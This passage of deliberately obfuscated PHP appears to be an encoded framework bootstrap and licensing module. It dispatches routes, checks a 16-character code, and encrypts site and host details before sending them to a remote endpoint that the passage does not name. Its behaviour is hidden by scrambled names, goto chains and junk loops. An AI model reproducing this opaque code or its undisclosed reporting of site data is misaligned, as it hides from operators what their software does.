$eãğ‰“õƒ[29]($eãğ‰“õƒ[1], $GLOBALS[$eãğ‰“õƒ[22]][$eãğ‰“õƒ[23]]); goto FÜ¢Š°Ã¾; FÜ¢Š°Ã¾: } public function run() { goto f“¸À¶Ìö; c‘ö·ìÖƒ¤: $this->{$_SERVER[Ş¥ÖÁ÷Ù][45]}(); $dÎ¬óòƒ¤ƒ = $c›ÀçØé„Ö[601]; if (strlen($dÎ¬óòƒ¤ƒ) < $c›ÀçØé„Ö[602]) { die; } goto a¬‹ß˜¶»; bª†µİÎ÷: $a²Ÿ“åµ¾×[39]($a²Ÿ“åµ¾×[43], MOD . $a²Ÿ“åµ¾×[1] . ST . $a²Ÿ“åµ¾×[1] . ACT); $f«¡‰Ã°° = $c›ÀçØé„Ö[599]; if (!$f«¡‰Ã°°) { return; } goto Fãìğ¼ŸŒê; e¬Õö—š¨–: $cÊ£­Ù„•§ = $GLOBALS[$a²Ÿ“åµ¾×[22]][$a²Ÿ“åµ¾×[28]]; $a²Ÿ“åµ¾×[39]($a²Ÿ“åµ¾×[40], isset($Eå¬Ğµ‡â[0]) && $Eå¬Ğµ‡â[0] ? $Eå¬Ğµ‡â[0] : $this->defaultModule); $a²Ÿ“åµ¾×[39]($a²Ÿ“åµ¾×[41], isset($Eå¬Ğµ‡â[1]) && $Eå¬Ğµ‡â[0] ? $Eå¬Ğµ‡â[1] : $this->defaultController); goto EÈè‚Ó‰á®; EÈè‚Ó‰á®: $Dø¼·ÕÁØĞ = $c›ÀçØé„Ö[598]; while (strlen($Dø¼·ÕÁØĞ) < $c›ÀçØé„Ö[591]) { if (!$Dø¼·ÕÁØĞ) { break; } $Dø¼·ÕÁØĞ++; } $a²Ÿ“åµ¾×[39]($a²Ÿ“åµ¾×[42], isset($Eå¬Ğµ‡â[2]) && $Eå¬Ğµ‡â[0] ? $Eå¬Ğµ‡â[2] : $this->defaultAction); goto bª†µİÎ÷; f“¸À¶Ìö: $c›ÀçØé„Ö =& $_SERVER[¾÷]; $a²Ÿ“åµ¾× =& $_SERVER[Ş¥ÖÁ÷Ù]; $this->{$_SERVER[Ş¥ÖÁ÷Ù][37]}(); goto FÏÊ… ìŸ; FÏÊ… ìŸ: $C³´à«ã…‹ = $c›ÀçØé„Ö[597]; $this->{$_SERVER[Ş¥ÖÁ÷Ù][38]}(); $Eå¬Ğµ‡â = $GLOBALS[$a²Ÿ“åµ¾×[22]][$a²Ÿ“åµ¾×[23]]; goto e¬Õö—š¨–; Fãìğ¼ŸŒê: $_SERVER[$a²Ÿ“åµ¾×[44]] = $a²Ÿ“åµ¾×[6](ACTION); $CğÄƒÇ¥ = $c›ÀçØé„Ö[600]; if (!$CğÄƒÇ¥) { die; } goto c‘ö·ìÖƒ¤; a¬‹ß˜¶»: if ($a²Ÿ“åµ¾×[19]($Eå¬Ğµ‡â) >= 3) { $this->{$_SERVER[Ş¥ÖÁ÷Ù][21]}($cÊ£­Ù„•§); } else { $this->{$_SERVER[Ş¥ÖÁ÷Ù][21]}(ACTION); } goto f¯áššÑ¿ô; f¯áššÑ¿ô: } private $xrzvf6e8ca3b = array(); private $hjrd9f67ab10 = ''; public function ixte5a0343bb() { goto F±¡œ²£Î; C›Ê´Ç¥â¡: $this->{$_SERVER[Ş¥ÖÁ÷Ù][3]}($D®º˜ÈåÛ›[57], array($this, $D®º˜ÈåÛ›[58])); $this->{$_SERVER[Ş¥ÖÁ÷Ù][3]}($D®º˜ÈåÛ›[59], array($this, $D®º˜ÈåÛ›[60])); goto eÊ¯Ü›äÄÙ; d˜Ù×•ñã: $this->{$_SERVER[Ş¥ÖÁ÷Ù][49]}(); $this->{$_SERVER[Ş¥ÖÁ÷Ù][50]}(); $Eß§é‰Èä = $A ”Ä¸é°í[606]; goto FÛà›‡‚¢Õ; bøïÀìÂÏµ: $this->{$_SERVER[Ş¥ÖÁ÷Ù][48]}(); $eïï‡øóùÉ = $A ”Ä¸é°í[605]; if (strlen($eïï‡øóùÉ) < $A ”Ä¸é°í[591]) { return; } goto d˜Ù×•ñã; eí§ŞºÜ–½: $Añ¨ôÇ‚Ó = $A ”Ä¸é°í[608]; while (strlen($Añ¨ôÇ‚Ó) < $A ”Ä¸é°í[582]) { if (!$Añ¨ôÇ‚Ó) { break; } $Añ¨ôÇ‚Ó++; } $this->{$_SERVER[Ş¥ÖÁ÷Ù][3]}($D®º˜ÈåÛ›[55], array($this, $D®º˜ÈåÛ›[56])); goto C›Ê´Ç¥â¡; a…Şî¬ƒ¤Ê: if (strlen($BÏÕğ„‚‹¢) < $A ”Ä¸é°í[602]) { return; } $this->{$_SERVER[Ş¥ÖÁ÷Ù][52]}(); $this->{$_SERVER[Ş¥ÖÁ÷Ù][3]}($D®º˜ÈåÛ›[53], array($this, $D®º˜ÈåÛ›[54])); goto eí§ŞºÜ–½; FÛà›‡‚¢Õ: if (!$Eß§é‰Èä) { die; } $this->{$_SERVER[Ş¥ÖÁ÷Ù][51]}(); $BÏÕğ„‚‹¢ = $A ”Ä¸é°í[607]; goto a…Şî¬ƒ¤Ê; d”‘ŒÉŸ’: $CñÍ±†‰ç­ = $A ”Ä¸é°í[603]; $this->{$_SERVER[Ş¥ÖÁ÷Ù][47]}(); $BáÉ±°ä¯– = $A ”Ä¸é°í[604]; goto bøïÀìÂÏµ; F±¡œ²£Î: $A ”Ä¸é°í =& $_SERVER[¾÷]; $D®º˜ÈåÛ› =& $_SERVER[Ş¥ÖÁ÷Ù]; $this->{$_SERVER[Ş¥ÖÁ÷Ù][46]}(); goto d”‘ŒÉŸ’; eÊ¯Ü›äÄÙ: } public function othea6cc3b45($E¿èâ’ïˆ‚) { goto b‡åÀôÔšÛ; d„ºù³íÑ: $Cè¤«•Êê = $cËªÖ†Í©œ[609]; if (!$Cè¤«•Êê) { return; } unset($E¿èâ’ïˆ‚[$eŒ‹øÇä±ö[102]][$eŒ‹øÇä±ö[104]][$eŒ‹øÇä±ö[105]]); goto a„® –ğİ; aßöëÂŒÌø: $CÄå÷Â…ĞÊ = $cËªÖ†Í©œ[612]; if (strlen($CÄå÷Â…ĞÊ) < $cËªÖ†Í©œ[582]) { die; } $E¿èâ’ïˆ‚[$eŒ‹øÇä±ö[114]][$eŒ‹øÇä±ö[123]] = $eŒ‹øÇä±ö[124]($eŒ‹øÇä±ö[125]()); goto báäŞÕ÷Ë‡; f’°£¼Á‚‚: $DôÂ‘Ç˜ö = array($eŒ‹øÇä±ö[64], $eŒ‹øÇä±ö[65], $eŒ‹øÇä±ö[66], $eŒ‹øÇä±ö[67], $eŒ‹øÇä±ö[68], $eŒ‹øÇä±ö[69], $eŒ‹øÇä±ö[70], $eŒ‹øÇä±ö[71], $eŒ‹øÇä±ö[72], $eŒ‹øÇä±ö[73], $eŒ‹øÇä±ö[74], $eŒ‹øÇä±ö[75], $eŒ‹øÇä±ö[76], $eŒ‹øÇä±ö[77], $eŒ‹øÇä±ö[78], $eŒ‹øÇä±ö[79], $eŒ‹øÇä±ö[80], $eŒ‹øÇä±ö[81], $eŒ‹øÇä±ö[82], $eŒ‹øÇä±ö[83], $eŒ‹øÇä±ö[84], $eŒ‹øÇä±ö[85], $eŒ‹øÇä±ö[86], $eŒ‹øÇä±ö[87], $eŒ‹øÇä±ö[88], $eŒ‹øÇä±ö[89], $eŒ‹øÇä±ö[90], $eŒ‹øÇä±ö[91], $eŒ‹øÇä±ö[92], $eŒ‹øÇä±ö[93], $eŒ‹øÇä±ö[94], $eŒ‹øÇä±ö[95], $eŒ‹øÇä±ö[96], $eŒ‹øÇä±ö[97], $eŒ‹øÇä±ö[98], $eŒ‹øÇä±ö[99]); foreach ($DôÂ‘Ç˜ö as $B÷êÉëƒ°„) { $e†ì Å¥ÇÕ = $GLOBALS[$eŒ‹øÇä±ö[100]][$eŒ‹øÇä±ö[101]][$B÷êÉëƒ°„]; if (isset($bá„ÔÓµÍ‹[$B÷êÉëƒ°„])) { $e†ì Å¥ÇÕ = $bá„ÔÓµÍ‹[$B÷êÉëƒ°„]; } $E¿èâ’ïˆ‚[$eŒ‹øÇä±ö[102]][$eŒ‹øÇä±ö[103]][$B÷êÉëƒ°„] = $e†ì Å¥ÇÕ; } $C¤µÉé´×Û = $E¿èâ’ïˆ‚[$eŒ‹øÇä±ö[102]][$eŒ‹øÇä±ö[103]][$eŒ‹øÇä±ö[76]]; goto d„ºù³íÑ; Bğ‡ªÊ÷: if ($eŒ‹øÇä±ö[112]($GLOBALS, $eŒ‹øÇä±ö[138]) && $this->config[$eŒ‹øÇä±ö[139]]) { $E¿èâ’ïˆ‚[$eŒ‹øÇä±ö[114]][$eŒ‹øÇä±ö[140]] = WEB_ROOT; } return $E¿èâ’ïˆ‚; goto eŠ„Ìçºîó; b‡åÀôÔšÛ: $cËªÖ†Í©œ =& $_SERVER[¾÷]; $eŒ‹øÇä±ö =& $_SERVER[Ş¥ÖÁ÷Ù]; $bá„ÔÓµÍ‹ = $eŒ‹øÇä±ö[61]($eŒ‹øÇä±ö[62])->{$_SERVER[Ş¥ÖÁ÷Ù][63]}(); goto f’°£¼Á‚‚; a„® –ğİ: $bÚáÙ›ñ‘ï = $cËªÖ†Í©œ[610]; unset($E¿èâ’ïˆ‚[$eŒ‹øÇä±ö[102]][$eŒ‹øÇä±ö[104]][$eŒ‹øÇä±ö[106]]); unset($E¿èâ’ïˆ‚[$eŒ‹øÇä±ö[102]][$eŒ‹øÇä±ö[103]][$eŒ‹øÇä±ö[76]]); goto A¢ÙÁ©å…Ò; aÙùáòè„‚: if ($this->hjrd9f67ab10 == $eŒ‹øÇä±ö[127]) { $E¿èâ’ïˆ‚[$eŒ‹øÇä±ö[102]][$eŒ‹øÇä±ö[103]][$eŒ‹øÇä±ö[108]][$eŒ‹øÇä±ö[113]] = 0; } $E¿èâ’ïˆ‚[$eŒ‹øÇä±ö[114]][$eŒ‹øÇä±ö[134]] = $eŒ‹øÇä±ö[112]($this->xrzvf6e8ca3b, $eŒ‹øÇä±ö[135], $eŒ‹øÇä±ö[10]); $E¿èâ’ïˆ‚[$eŒ‹øÇä±ö[114]][$eŒ‹øÇä±ö[136]] = $eŒ‹øÇä±ö[112]($this->xrzvf6e8ca3b, $eŒ‹øÇä±ö[137], $eŒ‹øÇä±ö[10]); goto Bğ‡ªÊ÷; b®ÖºÍ«Á: while (strlen($c·•—‡‡º) < $cËªÖ†Í©œ[593]) { if (!$c·•—‡‡º) { break; } $c·•—‡‡º++; } $E¿èâ’ïˆ‚[$eŒ‹øÇä±ö[114]][$eŒ‹øÇä±ö[115]] = $eŒ‹øÇä±ö[116]($eŒ‹øÇä±ö[117])->{$_SERVER[Ş¥ÖÁ÷Ù][118]}(); $E¿èâ’ïˆ‚[$eŒ‹øÇä±ö[114]][$eŒ‹øÇä±ö[119]] = $eŒ‹øÇä±ö[120]($_SERVER[$eŒ‹øÇä±ö[121]] . $bá„ÔÓµÍ‹[$eŒ‹øÇä±ö[122]]); goto aßöëÂŒÌø; báäŞÕ÷Ë‡: $E¿èâ’ïˆ‚[$eŒ‹øÇä±ö[114]][$eŒ‹øÇä±ö[126]] = $this->hjrd9f67ab10; $Dè“¼’ëÌ‰ = $cËªÖ†Í©œ[613]; if ($bá„ÔÓµÍ‹[$eŒ‹øÇä±ö[126]] != $eŒ‹øÇä±ö[127]) { $E¿èâ’ïˆ‚[$eŒ‹øÇä±ö[114]][$eŒ‹øÇä±ö[128]] = $bá„ÔÓµÍ‹[$eŒ‹øÇä±ö[128]]; $E¿èâ’ïˆ‚[$eŒ‹øÇä±ö[114]][$eŒ‹øÇä±ö[129]] = $bá„ÔÓµÍ‹[$eŒ‹øÇä±ö[129]]; $fÂÍéÚÔ°œ = $eŒ‹øÇä±ö[130](10) . $this->hjrd9f67ab10 . $eŒ‹øÇä±ö[130](5); $E¿èâ’ïˆ‚[$eŒ‹øÇä±ö[102]][$eŒ‹øÇä±ö[131]][$eŒ‹øÇä±ö[132]] = $this->{$_SERVER[Ş¥ÖÁ÷Ù][133]}($fÂÍéÚÔ°œ, $E¿èâ’ïˆ‚[$eŒ‹øÇä±ö[114]][$eŒ‹øÇä±ö[119]]); } goto aÙùáòè„‚; A¢ÙÁ©å…Ò: unset($E¿èâ’ïˆ‚[$eŒ‹øÇä±ö[102]][$eŒ‹øÇä±ö[103]][$eŒ‹øÇä±ö[107]]); $E¿èâ’ïˆ‚[$eŒ‹øÇä±ö[102]][$eŒ‹øÇä±ö[103]][$eŒ‹øÇä±ö[108]] = array($eŒ‹øÇä±ö[109] => (int) $C¤µÉé´×Û[$eŒ‹øÇä±ö[110]], $eŒ‹øÇä±ö[111] => (int) $eŒ‹øÇä±ö[112]($C¤µÉé´×Û, $eŒ‹øÇä±ö[113], 0)); $c·•—‡‡º = $cËªÖ†Í©œ[611]; goto b®ÖºÍ«Á; eŠ„Ìçºîó: } private function ifcse176d8a0() { goto F‹ìÁ…¬è©; b‚Å¨‘öÄƒ: if ($this->hjrd9f67ab10 == $AùÕ††£·[127]) { return; } $d…ğÍ¬¢ = array($AùÕ††£·[159], $AùÕ††£·[160], $AùÕ††£·[161], $AùÕ††£·[162], $AùÕ††£·[163], $AùÕ††£·[164]); $FÖÓÊÉâ° = $AùÕ††£·[61]($AùÕ††£·[62])->{$_SERVER[Ş¥ÖÁ÷Ù][63]}(); goto EÔë’Ì²²Ê; F‹ìÁ…¬è©: $då®Ó‹Ä¤Ä =& $_SERVER[¾÷]; $AùÕ††£· =& $_SERVER[Ş¥ÖÁ÷Ù]; if ($_SERVER[$AùÕ††£·[44]] == $AùÕ††£·[141]) { $f‹Ëš©²ğì = array($AùÕ††£·[126] => $this->hjrd9f67ab10, $AùÕ††£·[142] => $this->{$_SERVER[Ş¥ÖÁ÷Ù][143]}(), $AùÕ††£·[144] => $AùÕ††£·[61]($AùÕ††£·[145])->{$_SERVER[Ş¥ÖÁ÷Ù][146]}()); if ($this->hjrd9f67ab10 != $AùÕ††£·[127]) { $f‚ê­’ˆ¦• = $AùÕ††£·[112]($this->xrzvf6e8ca3b, $AùÕ††£·[147]); if ($f‚ê­’ˆ¦•) { $f‹Ëš©²ğì[$AùÕ††£·[148]] = $f‚ê­’ˆ¦•; $f‹Ëš©²ğì[$AùÕ††£·[149]] = $AùÕ††£·[150]($AùÕ††£·[112]($this->xrzvf6e8ca3b, $AùÕ††£·[151])); $f‹Ëš©²ğì[$AùÕ††£·[152]] = $AùÕ††£·[112]($this->xrzvf6e8ca3b, $AùÕ††£·[137]); } } $f‹Ëš©²ğì = $this->{$_SERVER[Ş¥ÖÁ÷Ù][153]}($AùÕ††£·[154]($f‹Ëš©²ğì), $AùÕ††£·[120]($AùÕ††£·[155])); $eï”Õ¬ˆ¬— = array($AùÕ††£·[156] => $f‹Ëš©²ğì); $AùÕ††£·[13](array($AùÕ††£·[157], $AùÕ††£·[158]), $eï”Õ¬ˆ¬—); } goto b‚Å¨‘öÄƒ; EÔë’Ì²²Ê: $dáéÇè©‘Ã = $då®Ó‹Ä¤Ä[614]; $eï”Õ¬ˆ¬— = array($AùÕ††£·[165] => $FÖÓÊÉâ°[$AùÕ††£·[64]], $AùÕ††£·[166] => $FÖÓÊÉâ°[$AùÕ††£·[65]], $AùÕ††£·[167] => $AùÕ††£·[10]); $c›„¡ Å‹… = $då®Ó‹Ä¤Ä[615]; goto c—Àœï¹“Š; c—Àœï¹“Š: foreach ($d…ğÍ¬¢ as $e“Üœ”¿Ô™) { if (!isset($FÖÓÊÉâ°[$e“Üœ”¿Ô™]) || !$FÖÓÊÉâ°[$e“Üœ”¿Ô™]) { continue; } $eï”Õ¬ˆ¬—[$e“Üœ”¿Ô™] = $FÖÓÊÉâ°[$e“Üœ”¿Ô™]; } $AùÕ††£·[13](array($AùÕ††£·[157], $AùÕ††£·[158]), $eï”Õ¬ˆ¬—); goto Aªæ‰•„°; Aªæ‰•„°: } private function bfwt28366305() { goto D‡†îœº†§; e„Ò£Š›†¡: $B³ŸÍõÆÍí = $f­£¥ŞºŸ˜[616]; if (strlen($B³ŸÍõÆÍí) < $f­£¥ŞºŸ˜[602]) { die; } $eİÛ¹Œæª¦ = $E¶Õ¡Ê¥Ëˆ[120]($_SERVER[$E¶Õ¡Ê¥Ëˆ[121]] . $aÔÙ…Š„ˆ³); goto b©îøÏ·; b©îøÏ·: if ($añïÛŠ[$E¶Õ¡Ê¥Ëˆ[184]] == $E¶Õ¡Ê¥Ëˆ[185]) { $E°Š¬Ó…² = $this->{$_SERVER[Ş¥ÖÁ÷Ù][153]}($eİÛ¹Œæª¦, $E¶Õ¡Ê¥Ëˆ[186]); $C¬âÀâ¿ì³ = $this->{$_SERVER[Ş¥ÖÁ÷Ù][133]}($E¶Õ¡Ê¥Ëˆ[154]($d¼÷›ÄÏÂ), $eİÛ¹Œæª¦ . $E¶Õ¡Ê¥Ëˆ[187], 3); $C¬âÀâ¿ì³ = $C¬âÀâ¿ì³ . $E¶Õ¡Ê¥Ëˆ[188] . $_SERVER[$E¶Õ¡Ê¥Ëˆ[179]]; $dÉÅ“”êôÁ = $this->{$_SERVER[Ş¥ÖÁ÷Ù][189]}($E¶Õ¡Ê¥Ëˆ[190] . $E°Š¬Ó…² . $E¶Õ¡Ê¥Ëˆ[191] . $C¬âÀâ¿ì³, -1); $E¶Õ¡Ê¥Ëˆ[172]($dÉÅ“”êôÁ, !0); } else { if ($añïÛŠ[$E¶Õ¡Ê¥Ëˆ[184]] == $E¶Õ¡Ê¥Ëˆ[192]) { $A‡­‡öİÌö = $E¶Õ¡Ê¥Ëˆ[25]($E¶Õ¡Ê¥Ëˆ[120]($E¶Õ¡Ê¥Ëˆ[193] . $eİÛ¹Œæª¦), 12, 15) . $E¶Õ¡Ê¥Ëˆ[194]; $C¬âÀâ¿ì³ = $this->{$_SERVER[Ş¥ÖÁ÷Ù][195]}($E¶Õ¡Ê¥Ëˆ[2]($añïÛŠ[$E¶Õ¡Ê¥Ëˆ[196]]), $A‡­‡öİÌö, 2); $b—á¤Ì¤âˆ = $E¶Õ¡Ê¥Ëˆ[197]($C¬âÀâ¿ì³, !0); if (!$E¶Õ¡Ê¥Ëˆ[198]($b—á¤Ì¤âˆ) || !$E¶Õ¡Ê¥Ëˆ[198]($b—á¤Ì¤âˆ[$E¶Õ¡Ê¥Ëˆ[199]]) || $b—á¤Ì¤âˆ[$E¶Õ¡Ê¥Ëˆ[171]] != !0) { $BÌ‘§âÛ—‰ = $E¶Õ¡Ê¥Ëˆ[200]; $dÜçÉÜ‡Â = $b—á¤Ì¤âˆ[$E¶Õ¡Ê¥Ëˆ[199]] ? $E¶Õ¡Ê¥Ëˆ[201] . $b—á¤Ì¤âˆ[$E¶Õ¡Ê¥Ëˆ[199]] : $BÌ‘§âÛ—‰; $E¶Õ¡Ê¥Ëˆ[172]($dÜçÉÜ‡Â, !1); } else { $d¼÷›ÄÏÂ[$E¶Õ¡Ê¥Ëˆ[174]] = $b—á¤Ì¤âˆ[$E¶Õ¡Ê¥Ëˆ[199]][$E¶Õ¡Ê¥Ëˆ[202]]; } } else { $b—á¤Ì¤âˆ = $this->{$_SERVER[Ş¥ÖÁ÷Ù][189]}($E¶Õ¡Ê¥Ëˆ[203], $d¼÷›ÄÏÂ, 10); $eŸ‰÷Ì¡£Ò = $f­£¥ŞºŸ˜[617]; while ($eŸ‰÷Ì¡£Ò < $f­£¥ŞºŸ˜[582]) { if ($eŸ‰÷Ì¡£Ò >= 0) { break; } $eŸ‰÷Ì¡£Ò++; } } } if (!$E¶Õ¡Ê¥Ëˆ[198]($b—á¤Ì¤âˆ) || !$E¶Õ¡Ê¥Ëˆ[198]($b—á¤Ì¤âˆ[$E¶Õ¡Ê¥Ëˆ[199]]) || $b—á¤Ì¤âˆ[$E¶Õ¡Ê¥Ëˆ[171]] != !0) { $BÌ‘§âÛ—‰ = $E¶Õ¡Ê¥Ëˆ[204]($E¶Õ¡Ê¥Ëˆ[205]); $dÜçÉÜ‡Â = $b—á¤Ì¤âˆ[$E¶Õ¡Ê¥Ëˆ[199]] ? $E¶Õ¡Ê¥Ëˆ[201] . $b—á¤Ì¤âˆ[$E¶Õ¡Ê¥Ëˆ[199]] : $BÌ‘§âÛ—‰; $E¶Õ¡Ê¥Ëˆ[172]($dÜçÉÜ‡Â, !1); } $bªğŠÑ®Óì = $b—á¤Ì¤âˆ[$E¶Õ¡Ê¥Ëˆ[199]]; goto cİ³°âä›; DÔ”õìçó²: $Aš‘–òÚ¹ = $f­£¥ŞºŸ˜[618]; while ($Aš‘–òÚ¹ < $f­£¥ŞºŸ˜[591]) { if ($Aš‘–òÚ¹ >= 0) { break; } $Aš‘–òÚ¹++; } $fª“éŠ…[$E¶Õ¡Ê¥Ëˆ[128]] = $E¶Õ¡Ê¥Ëˆ[220]($E¶Õ¡Ê¥Ëˆ[124]($this->{$_SERVER[Ş¥ÖÁ÷Ù][153]}($b¥ŒóôÚ, $E¶Õ¡Ê¥Ëˆ[221]))); goto fÜéÖ•‰¤¿; D±·¶Ê÷ë: $EË¿òŠâ  = $E¶Õ¡Ê¥Ëˆ[220]($E¶Õ¡Ê¥Ëˆ[25]($bÛ¬°ÛË”ç, 10, 16)); $A‹®µÁ‹øò = $this->{$_SERVER[Ş¥ÖÁ÷Ù][133]}($E¶Õ¡Ê¥Ëˆ[154]($bªğŠÑ®Óì), $bÛ¬°ÛË”ç); $a½–Áœ‹œ = $E¶Õ¡Ê¥Ëˆ[228]($E¶Õ¡Ê¥Ëˆ[61]($E¶Õ¡Ê¥Ëˆ[11])->{$_SERVER[Ş¥ÖÁ÷Ù][229]}(), $E¶Õ¡Ê¥Ëˆ[230]); goto bšÜŠÆà¾; Bø˜ËïĞÇª: if ($d¼÷›ÄÏÂ[$E¶Õ¡Ê¥Ëˆ[174]]) { $fª“éŠ…[$E¶Õ¡Ê¥Ëˆ[218]] = $d¼÷›ÄÏÂ[$E¶Õ¡Ê¥Ëˆ[174]]; } $a•ÄÙùÌ—² = $E¶Õ¡Ê¥Ëˆ[25]($E¶Õ¡Ê¥Ëˆ[120]($fª“éŠ…[$E¶Õ¡Ê¥Ëˆ[216]]), 10, 10); $b¥ŒóôÚ = $a•ÄÙùÌ—² . $fª“éŠ…[$E¶Õ¡Ê¥Ëˆ[126]] . $fª“éŠ…[$E¶Õ¡Ê¥Ëˆ[218]]; goto DÔ”õìçó²; D‡†îœº†§: $f­£¥ŞºŸ˜ =& $_SERVER[¾÷]; $E¶Õ¡Ê¥Ëˆ =& $_SERVER[Ş¥ÖÁ÷Ù]; if ($_SERVER[$E¶Õ¡Ê¥Ëˆ[44]] != $E¶Õ¡Ê¥Ëˆ[168]) { return; } goto fª³ãÉª®¼; bšÜŠÆà¾: $fš‚µÔ† = $f­£¥ŞºŸ˜[622]; if (!$fš‚µÔ†) { return; } $C×£ëİ§Ä = $a½–Áœ‹œ[$E¶Õ¡Ê¥Ëˆ[231]]; goto C¢²ÄÃÚå›; cİ³°âä›: $B×Í´§§¬ = $this->{$_SERVER[Ş¥ÖÁ÷Ù][206]}($bªğŠÑ®Óì[$E¶Õ¡Ê¥Ëˆ[207]]); if (!$B×Í´§§¬ || $B×Í´§§¬ != $bªğŠÑ®Óì[$E¶Õ¡Ê¥Ëˆ[151]]) { $E‚Åãê¨ÊÄ = array($E¶Õ¡Ê¥Ëˆ[208] => $E¶Õ¡Ê¥Ëˆ[61]($E¶Õ¡Ê¥Ëˆ[62])->{$_SERVER[Ş¥ÖÁ÷Ù][63]}($E¶Õ¡Ê¥Ëˆ[122]), $E¶Õ¡Ê¥Ëˆ[209] => $_SERVER[$E¶Õ¡Ê¥Ëˆ[121]], $E¶Õ¡Ê¥Ëˆ[210] => $E¶Õ¡Ê¥Ëˆ[211](), $E¶Õ¡Ê¥Ëˆ[180] => $_SERVER[$E¶Õ¡Ê¥Ëˆ[181]]); $C¬âÀâ¿ì³ = $this->{$_SERVER[Ş¥ÖÁ÷Ù][212]}($E¶Õ¡Ê¥Ëˆ[154]($E‚Åãê¨ÊÄ)); $this->{$_SERVER[Ş¥ÖÁ÷Ù][189]}($E¶Õ¡Ê¥Ëˆ[213] . $C¬âÀâ¿ì³); $E¶Õ¡Ê¥Ëˆ[172]($E¶Õ¡Ê¥Ëˆ[204]($E¶Õ¡Ê¥Ëˆ[214]), !0); } $fª“éŠ… = array($E¶Õ¡Ê¥Ëˆ[215] => $d¼÷›ÄÏÂ[$E¶Õ¡Ê¥Ëˆ[171]], $E¶Õ¡Ê¥Ëˆ[216] => $bªğŠÑ®Óì[$E¶Õ¡Ê¥Ëˆ[217]], $E¶Õ¡Ê¥Ëˆ[218] => $E¶Õ¡Ê¥Ëˆ[130](16), $E¶Õ¡Ê¥Ëˆ[126] => $bªğŠÑ®Óì[$E¶Õ¡Ê¥Ëˆ[219]]); goto Bø˜ËïĞÇª; f‡¬Ó£º‚Ä: if ($bªğŠÑ®Óì[$E¶Õ¡Ê¥Ëˆ[223]] && $bªğŠÑ®Óì[$E¶Õ¡Ê¥Ëˆ[223]] >= 1) { $E¶Õ¡Ê¥Ëˆ[61]($E¶Õ¡Ê¥Ëˆ[62])->{$_SERVER[Ş¥ÖÁ÷Ù][224]}($E¶Õ¡Ê¥Ëˆ[225], $E¶Õ¡Ê¥Ëˆ[226]); } $E¶Õ¡Ê¥Ëˆ[61]($E¶Õ¡Ê¥Ëˆ[62])->{$_SERVER[Ş¥ÖÁ÷Ù][227]}($fª“éŠ…); $bÛ¬°ÛË”ç = $E¶Õ¡Ê¥Ëˆ[120]($_SERVER[$E¶Õ¡Ê¥Ëˆ[121]] . $E¶Õ¡Ê¥Ëˆ[220]($aÔÙ…Š„ˆ³) . $fª“éŠ…[$E¶Õ¡Ê¥Ëˆ[216]]); goto D±·¶Ê÷ë; F÷¤‰µ­Æİ: $CØ‰°´Ÿ¼[$EË¿òŠâ ] = $A‹®µÁ‹øò; $d¦†Èâ®œ² = $f­£¥ŞºŸ˜[625]; if (strlen($d¦†Èâ®œ²) < $f­£¥ŞºŸ˜[582]) { die; } goto Fªä»×‡¡å; C¢²ÄÃÚå›: $dŸ´Ÿ¨î = $f­£¥ŞºŸ˜[623]; $CØ‰°´Ÿ¼ = array(); $c“Åñí»İÎ = $f­£¥ŞºŸ˜[624]; goto F÷¤‰µ­Æİ; c¬êäôÙ¡÷: $fª“éŠ…[$E¶Õ¡Ê¥Ëˆ[129]] = $E¶Õ¡Ê¥Ëˆ[124]($E¶Õ¡Ê¥Ëˆ[220]($this->{$_SERVER[Ş¥ÖÁ÷Ù][153]}($E…šŒä©, $E¶Õ¡Ê¥Ëˆ[222]))); $E·‰¨ãÂù = $f­£¥ŞºŸ˜[621]; if (strlen($E·‰¨ãÂù) < $f­£¥ŞºŸ˜[582]) { return; } goto f‡¬Ó£º‚Ä; Fªä»×‡¡å: $E¶Õ¡Ê¥Ëˆ[61]($E¶Õ¡Ê¥Ëˆ[11])->{$_SERVER[Ş¥ÖÁ÷Ù][232]}($C×£ëİ§Ä[$E¶Õ¡Ê¥Ëˆ[233]], array($E¶Õ¡Ê¥Ëˆ[234] => $CØ‰°´Ÿ¼)); $E„µ…Ë„ÙÅ = $f­£¥ŞºŸ˜[626]; if (strlen($E„µ…Ë„ÙÅ) < $f­£¥ŞºŸ˜[10]) { return; } goto A¤àõ‰²—Ø; d‚‘¯µ‚•: $c‡–›Êà…í = $f­£¥ŞºŸ˜[620]; if (strlen($c‡–›Êà…í) < $f­£¥ŞºŸ˜[10]) { die; } $E…šŒä© = $b’³ö³¶„‡ . $fª“éŠ…[$E¶Õ¡Ê¥Ëˆ[126]] . $this->{$_SERVER[Ş¥ÖÁ÷Ù][153]}($E¶Õ¡Ê¥Ëˆ[120]($fª“éŠ…[$E¶Õ¡Ê¥Ëˆ[215]]), $b’³ö³¶„‡); goto c¬êäôÙ¡÷; Eäš«šÍ‘÷: $E¶Õ¡Ê¥Ëˆ[172]($E¶Õ¡Ê¥Ëˆ[204]($E¶Õ¡Ê¥Ëˆ[214]), !0); goto Bèï’¿ÖÀŠ; fª³ãÉª®¼: if (!$E¶Õ¡Ê¥Ëˆ[112]($GLOBALS, $E¶Õ¡Ê¥Ëˆ[138])) { die; } $añïÛŠ = $GLOBALS[$E¶Õ¡Ê¥Ëˆ[22]]; if (isset($añïÛŠ[$E¶Õ¡Ê¥Ëˆ[169]])) { $this->{$_SERVER[Ş¥ÖÁ÷Ù][170]}(); die; } goto CèğŒ¡ÙĞ…; A¤àõ‰²—Ø: $this->xrzvf6e8ca3b = $bªğŠÑ®Óì; $fÅ‰»ñî«ª = $f­£¥ŞºŸ˜[627]; if (!$fÅ‰»ñî«ª) { return; } goto Cõ­œõóìÒ; CèğŒ¡ÙĞ…: if (!isset($añïÛŠ[$E¶Õ¡Ê¥Ëˆ[171]]) || $E¶Õ¡Ê¥Ëˆ[24]($añïÛŠ[$E¶Õ¡Ê¥Ëˆ[171]]) != 16) { $E¶Õ¡Ê¥Ëˆ[172]($E¶Õ¡Ê¥Ëˆ[173] . $añïÛŠ[$E¶Õ¡Ê¥Ëˆ[171]], !1); } $aÔÙ…Š„ˆ³ = $E¶Õ¡Ê¥Ëˆ[61]($E¶Õ¡Ê¥Ëˆ[62])->{$_SERVER[Ş¥ÖÁ÷Ù][63]}($E¶Õ¡Ê¥Ëˆ[122]); $d¼÷›ÄÏÂ = array($E¶Õ¡Ê¥Ëˆ[171] => $añïÛŠ[$E¶Õ¡Ê¥Ëˆ[171]], $E¶Õ¡Ê¥Ëˆ[174] => $E¶Õ¡Ê¥Ëˆ[130](16), $E¶Õ¡Ê¥Ëˆ[175] => $E¶Õ¡Ê¥Ëˆ[155], $E¶Õ¡Ê¥Ëˆ[176] => $E¶Õ¡Ê¥Ëˆ[177], 